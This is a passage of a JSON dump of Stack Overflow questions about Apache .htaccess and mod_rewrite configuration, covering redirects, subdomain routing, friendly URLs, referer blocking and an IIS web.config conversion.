<code>data.php</code></li>\n</ul>\n\n<p>What I've done so far in my .htaccess</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  Options +FollowSymlinks\n  RewriteEngine On\n  RewriteCond %{HTTP_HOST} ^([^.]+)\\.abc\\.def\\.com\\.br$ [NC]\n  RewriteCond %1 !^(www)$ [NC]\n  RewriteRule ^.*$ data.php?q=%1 \n&lt;/IfModule&gt;`\n</code></pre>\n"},{"tags":["wordpress",".htaccess","mod-rewrite","qtranslate"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12564589,"title":"RewriteCond issue with subdomains and paths in .htaccess","body":"<p>I have three different domains pointing to the same WordPress's host instance depending on the language (managed with the qTranslate plugin):</p>\n\n<pre><code>RewriteEngine On\nOptions +FollowSymLinks\nRewriteBase /\nRewriteCond %{HTTP_HOST} ^(www\\.)?mydomain\\.cat$\nRewriteRule ^/?$ \"http\\:\\/\\/ca\\.mydomain\\.com\\/\" [R=301,L]\nRewriteCond %{HTTP_HOST} ^(www\\.)?mydomain\\.com$\nRewriteRule ^/?$ \"http\\:\\/\\/en\\.mydomain\\.com\\/\" [R=301,L]\nRewriteCond %{HTTP_HOST} ^(www\\.)?mydomain\\.es$\nRewriteRule ^/?$ \"http\\:\\/\\/es\\.mydomain\\.com\\/\" [R=301,L]\n</code></pre>\n\n<p>With that I've managed to achieve the following redirects:</p>\n\n<ul>\n<li>mydomain.cat or www.mydomain.cat ---> <strong>ca</strong>.mydomain.com ---> Shows website in catalan</li>\n<li>mydomain.es or www.mydomain.es ---> <strong>es</strong>.mydomain.com ---> Shows website in spanish</li>\n<li>mydomain.com or www.mydomain.com ---> <strong>en</strong>.mydomain.com ---> Shows website in english</li>\n</ul>\n\n<p>Now the trouble I have is that, for example, user types mydomain.cat/work it doesn't works fine, it goes to mydomain.com/work/ and the language part in the subdomain is missing. It would be perfect if, in that case, it redirects to ca.mydomain.com/work.</p>\n\n<p>I've researched and tried to modify the three RewriteCond rules to \"add\" the additional content at the end of the url (don't know if is better with QUERY_STRING or with parameters) if it exists, but I couldn't get it working fine, rather I don't know if it's the best way to achieve it.</p>\n\n<p>Anyone can help me or give me a clue?</p>\n"},{"tags":[".htaccess","mod-rewrite","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12401895,"title":".htaccess doens't work on subdomain","body":"<p>I wrote a little .htaccess document, to rewrite url's from 127.0.0.1/index.php?page=dashboard to 127.0.0.1/dashboard. This works fine on my localhost, but when I place it on the subdomain of a domain name, it stops working.\nHere is my .htaccess:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n\nRewriteRule ^$ login.php [NC]\nRewriteRule ^login/?$ login.php [NC]\nRewriteRule ^logout/?$ logout.php [NC]\n</code></pre>\n"},{"tags":[".htaccess","magento"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12542763,"title":"Magento 301 redirects for certain pages","body":"<p>I was advised from a SEO specialist to 301 redirect certain pages (e.g. .com/about-us , .com/contact-us) from my Magento installation to a version with ending / trailing slash.</p>\n\n<p>What would be the best way to have this accomplished and just affect the desired pages?</p>\n\n<p>Thank you.</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12564559,"title":"use .htaccess with php5.4 built-in server","body":"<p>In my development environment, I use the web built-in web server of php5.4 but it seems that .htaccess doesn't work correctly. I can't found the doc of that server. Can someone tell me if it is possible to use htaccess and mod_rewrite like apache?</p>\n\n<p>Thank you very much</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12559973,"title":".htaccess - redirect invalid URL","body":"<p>I have the following URL :\n  <code>www.domain.com.au/--xyz-75/</code> </p>\n\n<p>please suggest how do I redirect this url to homepage, i.e to <code>www.domain.com.au</code> using .htacees.</p>\n\n<p>The .htaccess file in public_html folder.</p>\n\n<p>Application is developed in php.</p>\n\n<p>If it is not possible in .htaccess , then is there any other way?</p>\n"},{"tags":["php",".htaccess","version"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12561203,"title":"how to change php version in htaccess in server","body":"<p>I'm using php version 5.3 in my local. In server we are having php 4.8. Our server is shared server. so i want to change php version in server via htaccess file. Is it possible to do it? If yes how to do it? Thanks is advance</p>\n"},{"tags":["html","apache",".htaccess","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12562914,"title":"Loss of format due to .htaccess","body":"<p>I'm making a .htaccess for my web page, here's the code:</p>\n\n<pre><code>Options -Indexes\n\nRewriteEngine On\nRewriteRule ^([A-Za-z]+)/([0-9]+)/$ files.php?row=$1&amp;column=$2 \n\nRewriteRule ^([A-Za-z]+)/?$ $1/1/ \n\nRewriteCond %{HTTP_REFERER} !^http://(www\\.)?mywebpage\\.at [NC]\nRewriteCond %{HTTP_REFERER} !^$\nRewriteCond %{HTTP_REFERER} ^http://.*$\nRewriteRule \\.(jpe?g|gif|bmp|png)$ /imgs/hotlinks.png [L] \n\nRewriteCond %(REQUEST_URI) ^imgs/$ [NC]\nRewriteRule / - [F]\n\nErrorDocument 404 /404.html\n\nErrorDocument 403 /403.html\n</code></pre>\n\n<p>The problem is, my images are not showing up in pages with rewritten URLs. Apparently, their routes are also affected by the rewriting. Simply explained: an image located at www.mywebpage.at/imgs/pic1.jpg loads on www.mywebpage.at/files.php?row=first&amp;column=3, but when I try to enter www.mywebpage.at/first/3/ the browser looks for the image in www.mywebpage.at/first/3/imgs/pic1.jpg, and obviously fails to load it.</p>\n\n<p>How can I fix this so that the routes of the images do not change, no matter from where I use them?</p>\n"},{"tags":["php",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12561575,"title":"404 page not found error","body":"<p>I am using a WAMP server and I need to change the \"404 not found page\" style using htaccess. How can I do it?</p>\n\n<p>\"Not Found</p>\n\n<p>The requested URL /viewprofile.php was not found on this server\".Here is my htaccess file</p>\n\n<pre><code>    RewriteEngine on\nRewriteRule (.*)-(.*).htm$ viewprofile.php?id=$1\nRewriteRule (.*).htm$ viewprofile.php?id=$2\nRewriteRule viewads(.*)\\.htm$ viewads.php?id=$1\nRewriteRule (.*)&amp;(.*)\\.htm$ homeads.php?id=$2\nRewriteRule (.*).htm$ profile_city.php?id=$1\nRewriteRule (.*).htm$ profile_cast.php?id=$1\n\n\n\nRewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^(.*)$ $1.php\n</code></pre>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12557377,"title":"Apache Rewrite rule with multiple files from same virtual directory?","body":"<p>There are two parts to this problem:</p>\n\n<ol>\n<li>I have used htaccess rewrite to change \"file.php\" to just \"file\" so <a href=\"http://www.example.com/file\" rel=\"nofollow\">http://www.example.com/file</a> works just like <a href=\"http://www.example.com/file.php\" rel=\"nofollow\">http://www.example.com/file.php</a></li>\n</ol>\n\n<p>Here is part of my .htaccess that deals with that:</p>\n\n<pre><code>    RewriteCond %{REQUEST_FILENAME}.php -f\n    RewriteRule (.+) /$1.php [L]\n</code></pre>\n\n<ol>\n<li>The second part is the directory problem:</li>\n</ol>\n\n<p>Here is part of my .htaccess that deals with the issue:</p>\n\n<pre><code>    RewriteRule ^register website/register\n\n    RewriteRule ^register/rules website/rules\n</code></pre>\n\n<p>What I am trying to accomplish is this:</p>\n\n<p><a href=\"http://www.example.com/register\" rel=\"nofollow\">http://www.example.com/register</a> uses the rewrite rule to show website/register\n<a href=\"http://www.example.com/register/rules\" rel=\"nofollow\">http://www.example.com/register/rules</a> uses the rewrite rule to show website/rules</p>\n\n<p>The problem is that the URL box shows example.com/register/rules but the page continues to show the content of example.com/register.</p>\n\n<p>What is going wrong here? Is it the \".php\" extension is the first part that is causing all this? Or is my htaccess just completely wrong?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12558551,"title":".htaccess RewriteRule makes the address bar url changes when there isn't an end slash","body":"<p>I have an strange situation with .htaccess configuration.\nI have a multidomain hosting, with one directory per each domain.\nFor example, I have:</p>\n\n<pre><code>http://www.domain1.com\nhttp://www.domain2.com\n</code></pre>\n\n<p>and the following directory structure:</p>\n\n<pre><code>/domain1/\n/domain1/index.php\n/domain2/\n/domain2/index.php\n/domain2/subdirectory/\n/domain2/subdirectory/index.php\n</code></pre>\n\n<p>and a <code>.htaccess</code> file with the following content:</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{HTTP_HOST} ^(www\\.)?domain1\\.com$ [NC]\nRewriteCond %{REQUEST_URI} !^/domain1/.*$\nRewriteRule ^(.*)$ domain1/$1 [L]\n\nRewriteCond %{HTTP_HOST} ^(www\\.)?domain2\\.com$ [NC]\nRewriteCond %{REQUEST_URI} !^/domain2/.*$\nRewriteRule ^(.*)$ domain2/$1 [L]\n</code></pre>\n\n<p>all works as I like with one exception:\nif I do:</p>\n\n<pre><code>http://www.domain2.com/subdirectory/\n</code></pre>\n\n<p>(with a slash at the end)\nthe content is showed propertly and the url on the address bar keep unchanged, but\nif I do:</p>\n\n<pre><code>http://www.domain2.com/subdirectory\n</code></pre>\n\n<p>(without a slash at the end)\nthe content is showed properly but the url on the address bar is changed to:</p>\n\n<pre><code>http://www.domain2.com/domain2/subdirectory/\n</code></pre>\n\n<p>(notice the subdirectory name and a slash is appended at the end)\nand I don't like the user see that change on the address bar, that's my problem</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12513221,"title":"301 Redirecting Multiple Pages","body":"<p>My rewrite rule almost works but there are still some problems. Here is the code:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^tag/(.*)$ /?s=$1&amp;search=GA [L,R=301]\n</code></pre>\n\n<p>The <strong>first</strong> problem now is that the redirect links to:</p>\n\n<pre><code>mydomain.com/?s=tag/&amp;search=GA\n</code></pre>\n\n<p>How can I get rid of the second slash?</p>\n\n<p>Now the <strong>second</strong> problem... when a tag contains more than 1 word (for example the tag marketing tips) the redirect is:</p>\n\n<pre><code>mydomain.com/?s=marketing-tips/&amp;search=GA\n</code></pre>\n\n<p>How do I convert that - symbol to a + symbol?</p>\n"}]}
{"total":14528,"page":15,"pagesize":100,"questions":[{"tags":[".htaccess","mod-rewrite","joomla2.5"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12558543,"title":"need to correct a RewriteRule for joomla htaccess","body":"<p>So someone in china keeps redirecting peoples browsers to a copy of my site.\nHere is how i found out.</p>\n\n<p>I have a joomla installation where someone posted a message on the forum.\nUsually the email i get is\nHey someone posted a message..... heres the topic link</p>\n\n<p><code>www.antifmradio.com/</code> link somewhere in the site forum\nok all great but today i get an email with this instead</p>\n\n<pre><code>http://122.72.0.7www.antifmradio.com\n</code></pre>\n\n<p>So this <code>http://www.antifmradio.com</code>  </p>\n\n<p>was changed to this </p>\n\n<p><code>http://122.72.0.7www.antifmradio.com</code></p>\n\n<p>Ok so here is what i did. I created this rewrite rule</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^http://122.72.0.7www.antifmradio.com [NC]\nRewriteRule ^(.*)$ http://www.antifmradio.com/$1 [R=301,L]\n</code></pre>\n\n<p>Now no matter what you do, if you try going to the 122.72.0.7 link\nyou will always end up correctly at my correct domain</p>\n\n<p>awesome!</p>\n\n<p>Now this only works in my ROOT folder of my domain,\ni need to know how to write this so it works in my joomla directly.</p>\n\n<p>Joomla has its own htaccess file and i am using.\nBut i dont know where to place this rewrite rule in there.</p>\n\n<p>Also in my domain root folder i tried doing this so it would recognize joomla folder too</p>\n\n<pre><code>RewriteRule ^(.*)$ http://www.antifmradio.com/$1**/$1** [R=301,L]\n</code></pre>\n\n<p>but that didnt work by just adding the additional <code>/$1</code> to the end</p>\n"},{"tags":["wordpress",".htaccess","loops","rewrite","internal"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12547510,"title":"htaccess rewrite_rule causes loop; wordpress internal server error","body":"<p>A few days ago our website got attacked by several identified referer websites. the errorlog gets filled with around 1Gb failed requests daily and lots of internal sevrer errors in the wordpress installation.</p>\n\n<p>to avoid this I wrote the following htaccess rewrite rules to stop trafic from specific referers.\nSo far they helped, the page improved it's availability.\nBut still though the error log is now filled with:\n[Sat Sep 22 13:14:29 2012] [error] [client 188.32.141.123] Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace., referer: <a href=\"http://www.aztecmebel.ru/index.php?productID=1883&amp;picture_id=3919\" rel=\"nofollow\">http://www.aztecmebel.ru/index.php?productID=1883&amp;picture_id=3919</a>\nI assume the rewrite rule [F] causes the loop by sending the referer to a failure page which again gets rewrote...\nAny idea how to stop ths? e.g. if rule has been applied once, don't do it anymore? I want to avoid that th eerrorlog gets further filled... and that unneccesary loops eat up CPU...</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase /\n\nRewriteCond %{ENV:REDIRECT_STATUS} 200\nRewriteRule .* - [L]\n\nRewriteCond %{HTTP_REFERER} aztecmebel\\.ru [NC,OR]\nRewriteCond %{HTTP_REFERER} www\\.aztecmebel\\.ru [NC,OR]\nRewriteCond %{HTTP_REFERER} thanglongflc\\.edu\\.vn [NC,OR]\nRewriteCond %{HTTP_REFERER} www\\.thanglongflc\\.edu\\.vn [NC,OR]\nRewriteCond %{HTTP_REFERER} gornji-rahic\\.net [NC,OR]\nRewriteCond %{HTTP_REFERER} www\\.gornji-rahic\\.net [NC,OR]\nRewriteCond %{HTTP_REFERER} ams\\.co\\.th [NC,OR]\nRewriteCond %{HTTP_REFERER} www\\.ams\\.co\\.th [NC,OR]\nRewriteCond %{HTTP_REFERER} yuanzhixing\\.com [NC,OR]\nRewriteCond %{HTTP_REFERER} www\\.yuanzhixing\\.com [NC,OR]\nRewriteCond %{HTTP_REFERER} forumdownload\\.net [NC,OR]\nRewriteCond %{HTTP_REFERER} www\\.forumdownload\\.net [NC,OR]\nRewriteCond %{HTTP_REFERER} ybcz\\.cn [NC,OR]\nRewriteCond %{HTTP_REFERER} www\\.ybcz\\.cn\nRewriteRule .* - [F]\n</code></pre>\n"},{"tags":[".htaccess","content-management-system","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12544352,"title":"Using an img. subdomain with cmsms to increase load-times","body":"<p>I am currently using CMS Made Simple 1.11.2. I have created a subdomain of img.domain.com and would like to use that for all images used on the site. With cmsms images are typically stored in domain.com/cms/uploads/images/<em>.</em>. </p>\n\n<p>In other words any references to images in urls should be converted to use the new subdomain such as img.domain.com/cms/example.jpg.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12551235,"title":"htacess: forcing https and www if not on localhost","body":"<p>I work on my localhost so I need this exception in my mod_rewrite rule. Currently, I am able to force the \"www\" when not on localhost using the following:</p>\n\n<pre><code># Force www, if not in localhost\nRewriteCond %{HTTP_HOST} !=localhost\nRewriteCond %{HTTP_HOST} !^www\\.\nRewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n</code></pre>\n\n<p>Now, I want to also force https (my entire site will be under https). How do I add this to my htaccess?</p>\n\n<p>I tried making my htaccess like this, but this is forcing https on my localhost also:</p>\n\n<pre><code># Force https, if not in localhost\nRewriteCond %{HTTP_HOST} !=localhost    \nRewriteCond %{HTTPS} !=on\nRewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n\n# Force www, if not in localhost\nRewriteCond %{HTTP_HOST} !=localhost\nRewriteCond %{HTTP_HOST} !^www\\.\nRewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n</code></pre>\n\n<p><strong>UPDATE 1:</strong>\nI think I need to remove the first <code>[R=301,L]</code>.</p>\n\n<p><strong>UPDATE 2:</strong>\nIf I have a URL like this: <code>https://scripts.domain.com</code>, I do not want it to become: <code>https://www.scripts.domain.com</code>.</p>\n"},{"tags":[".htaccess","mod-rewrite","rewrite"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12552575,"title":"exclude images folder from redirect rewrite rule","body":"<p>I have set up in my .htacces file so that anyone trying to visit the site gets redirected to index.html, which is an under construction page. I have an image on there, that doesnt display cos the link gets redirected to index.html, how do i exclude the image from the rule, the path is <code>/images/underConstruction.png.</code></p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_URI} !=/index.html\nRewriteRule ^ /index.html [R=301]\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12552797,"title":"Change domain name based on user IP Address with htaccess","body":"<p>I have a website that serves an international market and needs to use one of 3 different domain names based on the user's IP.</p>\n\n<p>Here are the use cases:</p>\n\n<ul>\n<li>User IP from the UK, domain name appears as www.example.co.uk</li>\n<li>User IP from Australia, domain name appears as www.example.co.au</li>\n<li>All other IPs, domain name appears as www.example.com</li>\n</ul>\n\n<p>In the answer, I do not need to know the exact IP addresses to use from each country, so you could use a generic IP in the answer - unless you want to go the extra mile and create this based on the actual IPs from the countries given.</p>\n\n<p>Thanks!</p>\n"},{"tags":[".htaccess","friendly-url","modx","modx-revolution"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":12487540,"title":"ModX Revo: friendly URLs not working","body":"<p>This seems to be a common issue but I have tried all the suggestions and none work.</p>\n\n<p>The issue is when I turn on Friendly URLs in ModX Revo all my links get broken (404s). The URLS do appear correct with the alias after them.</p>\n\n<p>Heres what I've tried:</p>\n\n<ul>\n<li>Changing ht.access to .htaccess </li>\n<li>Ensuring the correct path is present in <code>MODX_BASE_PATH</code> in the\nconfic.inc.php file</li>\n<li>Ensuring all FURL settings in System Settings are ok and correct</li>\n<li>Clearing browser and ModX caches</li>\n</ul>\n\n<p>If anyone can suggest something I've missed that would be great! Thanks</p>\n"},{"tags":[".htaccess","redirect","migration"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12555372,"title":"Redirecting Links from root to new Site in Sub-directory","body":"<p>I've recently changed my site over to Wordpress to allow for easier and more intuitive editing but this leaves me with a problem of redirecting links that I know are out there in forum posts and the like as well as linked imagery etc.</p>\n\n<p>I don't really want to remove the old site files just yet, just in case I need something from them but I don't want incoming visitors to see them.</p>\n\n<p>I could go and add redirects to links I can think of to the htaccess file but that would be too time consuming and one of the main reasons to transferring to Wordpress was because the web site had grown to big to do things manually, so there are a lot of potential links.</p>\n\n<p>An example of my old structure was mysite.com/index.html , mysite.com/index_2.php , mysite.com/contact/ etc...</p>\n\n<p>My new site structure is mysite.com/index.html , mysite.com/guests , mysite.com/guests/contact/ etc...</p>\n\n<p>So the new links for everything except the landing page (index.html) and a couple resource directories will be in the guests directory.</p>\n\n<p>Is there any easy (or less time intensive) way of directing traffic in a search engine friendly manner to the guests directory when required yet still allowing access to specific root folders?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect","shopping-cart"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12551995,"title":".htaccess Redirect / Change URL","body":"<p>I am having a trouble figuring out how to successfully use <a href=\"http://httpd.apache.org/docs/current/mod/mod_rewrite.html\" rel=\"nofollow\">mod_rewrite</a> to rewrite my urls for me.</p>\n\n<p>Basically google has indexed my webstore, and now i have rebuilt it at a seperate location and none of the google links work.  Rather then go through google and set customURLs for my whole site i want to add some .htaccess code to redirect to my new store instead, but it needs to maintain the whole link, this is where im lost.</p>\n\n<p>My old store was at</p>\n\n<pre><code>http://mystore.com/store/\n</code></pre>\n\n<p>My new store is at</p>\n\n<pre><code>http://mystore.com/shop/\n</code></pre>\n\n<p>So when users go to</p>\n\n<pre><code>http://mystore.com/store/categories/cheese/Mouldy/?page=5&amp;sort=featured\n</code></pre>\n\n<p>I need them to be reirected to</p>\n\n<pre><code>http://mystore.com/shop/categories/cheese/Mouldy/?page=5&amp;sort=featured\n</code></pre>\n\n<p>However, I need an exception to this rule to be my admin area.  So if i access:</p>\n\n<pre><code>http://mystore.com/store/admin/\n</code></pre>\n\n<p>I <strong>DO NOT</strong> want to end up at</p>\n\n<pre><code>http://mystore.com/shop/admin/\n</code></pre>\n\n<p>Because i still need accesss to my old admin panel.\nThanks in advance for any help!</p>\n"},{"tags":["regex",".htaccess","mod-rewrite","redirect","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":114,"score":-1,"question_id":12547111,"title":"htaccess redirect using RewriteCond and RewriteRule - complex url using regex","body":"<p>I need to create a  301 redirect using htaccess. </p>\n\n<p>Example :</p>\n\n<p>Take this url (old): domain/page.html?pid=21&amp;cid=730:pagetitle</p>\n\n<p>redirect to (new): <a href=\"http://www.domain.co.uk/page/section/pagetitle\" rel=\"nofollow\">http://www.domain.co.uk/page/section/pagetitle</a></p>\n\n<p>i tried  this, but dont work :(</p>\n\n<pre><code>##([0-9]+)?\nRewriteCond %{QUERY_STRING} pid=21&amp;cid=[0-9]{1,5}:(.*)\nRewriteRule ^/page.html http://www.domain.co.uk/page/section/%1? [NC,R=301]\n</code></pre>\n\n<p>the pagetitle and cid are dynamic and will change overtime.</p>\n\n<p>ideally i want to take the old url and strip everything apart from pagetitle (domain/page.html?pid=2&amp;cid=730:pagetitle) and than use this as query string for my redirect url....</p>\n\n<p>thanks</p>\n\n<p>UPDATE:</p>\n\n<p>More example:</p>\n\n<p>From:</p>\n\n<p><a href=\"http://www.domain.co.uk/page.html?pid=1&amp;cid=25:helloworld\" rel=\"nofollow\">http://www.domain.co.uk/page.html?pid=1&amp;cid=25:helloworld</a></p>\n\n<p><a href=\"http://www.domain.co.uk/page.html?pid=1&amp;cid=34:hellonew-world\" rel=\"nofollow\">http://www.domain.co.uk/page.html?pid=1&amp;cid=34:hellonew-world</a></p>\n\n<p><a href=\"http://www.domain.co.uk/page.html?pid=1&amp;cid=21:1pagetitle\" rel=\"nofollow\">http://www.domain.co.uk/page.html?pid=1&amp;cid=21:1pagetitle</a></p>\n\n<p>To:</p>\n\n<p><a href=\"http://www.domain.co.uk/page/section/helloworld\" rel=\"nofollow\">http://www.domain.co.uk/page/section/helloworld</a></p>\n\n<p><a href=\"http://www.domain.co.uk/page/section/hellonew-world\" rel=\"nofollow\">http://www.domain.co.uk/page/section/hellonew-world</a></p>\n\n<p><a href=\"http://www.domain.co.uk/page/section/1pagetitle\" rel=\"nofollow\">http://www.domain.co.uk/page/section/1pagetitle</a></p>\n\n<p>note: section = pid 1</p>\n\n<p>Results using Omega or mine rewrite rules gives a 404 page at moment. </p>\n\n<p>i only need the last part of query string - cid (page title), pid not important.  </p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12552726,"title":"How to properly rewrite a friendly URL?","body":"<p>I have a URL like <code>index.php?url_id=u5531e3aas01fe5c2</code> and I also want to make it work like <code>/u5531e3aas01fe5c2</code>, that it to pass a parameter to my PHP, but something is wrong with my code.</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /try/\nRewriteRule /u[a-z0-9]{17} /index.php?url_id=$1 [L,QSA]\n</code></pre>\n\n<p>P.S.\nAnd also is it possible to rewrite URL that if appears <code>index.php?url_id=u5531e3aas01fe5c2</code>, it would be rewritten to <code>/u5531e3aas01fe5c2</code></p>\n"},{"tags":[".htaccess","web-config","translate"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12552045,"title":"How do I convert .htaccess code to web.config?","body":"<p>I have a PHP CMS in Apache and my <code>.htaccess</code> is below here:</p>\n\n<pre><code> # -FrontPage-\n\nIndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*\n\n# AuthType Basic\n# AuthUserFile /home/tcdgroup/.htpasswd\n# AuthName tadbir-group\n\n# Require user test \n\n\nRewriteEngine On\n\nRewriteRule ^\\.htaccess$ - [F]\n\nRewriteCond %{REQUEST_URI} =\"\"\nRewriteRule ^.*$ /public/index.php [NC,L]\n\nRewriteCond %{REQUEST_URI} !^/public/.*$\nRewriteRule ^(.*)$ /public/$1\n\nRewriteCond %{REQUEST_FILENAME} -f\nRewriteRule ^.*$ - [NC,L]\n\nRewriteRule ^public/.*$ /public/index.php [NC,L]\n</code></pre>\n\n<p>and I want to translate it to web.config for an IIS web server.</p>\n\n<p>I searched and I found \"URL Rewrite\" tools to translate the format and the summery is below:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n    &lt;system.webServer&gt;\n        &lt;rewrite&gt;\n            &lt;rules&gt;\n                &lt;rule name=\"Imported Rule 1\"&gt;\n                    &lt;match url=\"^\\.htaccess$\" ignoreCase=\"false\" /&gt;\n                    &lt;action type=\"CustomResponse\" statusCode=\"403\" statusReason=\"Forbidden\" statusDescription=\"Forbidden\" /&gt;\n                &lt;/rule&gt;\n                &lt;rule name=\"Imported Rule 2\" stopProcessing=\"true\"&gt;\n                    &lt;match url=\"^.*$\" /&gt;\n                    &lt;conditions logicalGrouping=\"MatchAll\"&gt;\n                        &lt;add input=\"{URL}\" pattern=\"^&amp;quot;&amp;quot;$\" ignoreCase=\"false\" /&gt;\n                    &lt;/conditions&gt;\n                    &lt;action type=\"Rewrite\" url=\"/public/index.php\" /&gt;\n                &lt;/rule&gt;\n                &lt;rule name=\"Imported Rule 3\"&gt;\n                    &lt;match url=\"^(.*)$\" ignoreCase=\"false\" /&gt;\n                    &lt;conditions logicalGrouping=\"MatchAll\"&gt;\n                        &lt;add input=\"{URL}\" pattern=\"^/public/.*$\" ignoreCase=\"false\" negate=\"true\" /&gt;\n                    &lt;/conditions&gt;\n                    &lt;action type=\"Rewrite\" url=\"/public/{R:1}\" /&gt;\n                &lt;/rule&gt;\n                &lt;rule name=\"Imported Rule 4\" stopProcessing=\"true\"&gt;\n                    &lt;match url=\"^.*$\" /&gt;\n                    &lt;conditions logicalGrouping=\"MatchAll\"&gt;\n                        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" ignoreCase=\"false\" /&gt;\n                    &lt;/conditions&gt;\n                    &lt;action type=\"None\" /&gt;\n                &lt;/rule&gt;\n                &lt;rule name=\"Imported Rule 5\" stopProcessing=\"true\"&gt;\n                    &lt;match url=\"^public/.*$\" /&gt;\n                    &lt;action type=\"Rewrite\" url=\"/public/index.php\" /&gt;\n                &lt;/rule&gt;\n            &lt;/rules&gt;\n        &lt;/rewrite&gt;\n    &lt;/system.webServer&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>But when I upload it to my server, the following error shows up:</p>\n\n<blockquote>\n  <p><strong>500 - Internal server error</strong>. There is a problem with the resource you\n  are looking for, and it cannot be displayed.</p>\n</blockquote>\n\n<p>What could be the reason for this error?</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12371114,"title":".htaccess rule conflict","body":"<p>I have following rule on my .htaccess</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^/]+)/?$ stat.php?domain=$1 [L]\n\nErrorDocument 404 /page/404\n</code></pre>\n\n<p>and it seems like the rule is conflicting with each other.\nI know that the first rule is slightly incorrect to detect a domain name.</p>\n\n<p>so can any one help me what may be the proper rule to detect a domain name and rewrite the following rule from above code:</p>\n\n<p><code>RewriteRule ^([^/]+)/?$ stat.php?domain=$1 [L]</code></p>\n"},{"tags":["apache",".htaccess","redirect","external"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12526453,"title":"How to block external http header 302 redirect apache","body":"<p>I cannot block an external http header 302 redirect from pointing to my website.</p>\n\n<p>I have tried all the .htaccess redirect rules. I don't have access to the http conf file, my web host assures me this cannot be done, but cannot help me block this external http header.</p>\n\n<p>This is the code from the external http header:</p>\n\n<pre><code>`HTTP/1.1 302 Moved Temporarily =&gt;`\n`Date =&gt; Fri, 21 Sep 2012 07:35:15 GMT`\n`Server =&gt; Apache`\n`X-Powered-By =&gt; PHP/5.3.16`\n`Expires =&gt; Thu, 19 Nov 1981 08:52:00 GMT`\n`Cache-Control =&gt; no-store, no-cache, must-revalidate, post-check=0, pre-check=0`\n`Pragma =&gt; no-cache`\n`Set-Cookie =&gt; osCsid=eidbr9o47qqcjap8el0ck5la67; path=/; domain=http://nastydomain.co.uk`\n`Location =&gt; http://www.mydomain.co.uk/`\n`Connection =&gt; 